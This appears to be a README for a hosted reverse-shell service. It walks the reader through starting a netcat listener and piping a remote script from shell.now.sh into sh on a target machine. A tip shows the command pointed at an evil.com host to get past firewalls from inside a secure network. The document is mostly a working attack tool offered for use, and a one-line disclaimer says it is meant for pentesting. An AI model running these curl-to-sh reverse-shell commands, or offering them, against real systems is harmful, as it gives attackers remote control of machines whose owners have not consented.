Easy to remember reverse shell that should work on most Unix-like systems.

## Usage

### 1. Listen for connection

On your machine, open up a port and listen on it. You can do this easily with netcat.

```shell
nc -l 1337
```
### 2. Execute reverse shell on target

On the target machine, pipe the output of https://shell.now.sh/yourip:port into sh.

```shell
curl https://shell.now.sh/192.168.0.69:1337 | sh
```

### 3. Don't be a dick

This is meant to be used for pentesting or helping coworkers understand why they should always lock their computers. Please don't use this for anything malicious.

## Tip

You can use a hostname or an IP. Because this is a reverse connection it can punch through firewalls and connect to the internet.

e.g You could listen for connections on a server at evil.com and get a reverse shell from inside a secure network with:

```shell
curl https://shell.now.sh/evil.com:1337 | sh
```
